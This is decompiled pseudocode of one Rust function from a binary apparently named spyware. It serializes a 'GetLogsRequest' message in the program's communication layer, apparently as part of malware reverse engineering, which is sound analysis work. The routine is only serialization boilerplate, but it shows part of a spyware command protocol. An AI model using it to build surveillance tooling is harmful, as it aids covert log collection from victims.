__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetLogsRequest>::serialize(
        __int64 a1,
        __int64 a2,
        __int64 a3)
{
  int v3; // eax
  int v5; // ecx
  __int64 v6; // rdx
  unsigned __int8 v7; // si
  _DWORD v8[2]; // [rsp+0h] [rbp-38h] BYREF
  __int64 v9; // [rsp+8h] [rbp-30h]
  unsigned __int8 v10; // [rsp+10h] [rbp-28h]
  _BYTE v11[31]; // [rsp+11h] [rbp-27h]

  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(v8, a3, aGetlogsrequest, 14LL, 0LL);
  v3 = v8[0];
  if ( v8[0] == 33 )
  {
    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v9, v10);
  }
  else
  {
    v5 = v8[1];
    v6 = v9;
    v7 = v10;
    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11[15];
    *(_OWORD *)(a1 + 17) = *(_OWORD *)v11;
    *(_DWORD *)a1 = v3;
    *(_DWORD *)(a1 + 4) = v5;
    *(_QWORD *)(a1 + 8) = v6;
    *(_BYTE *)(a1 + 16) = v7;
  }
  return a1;
}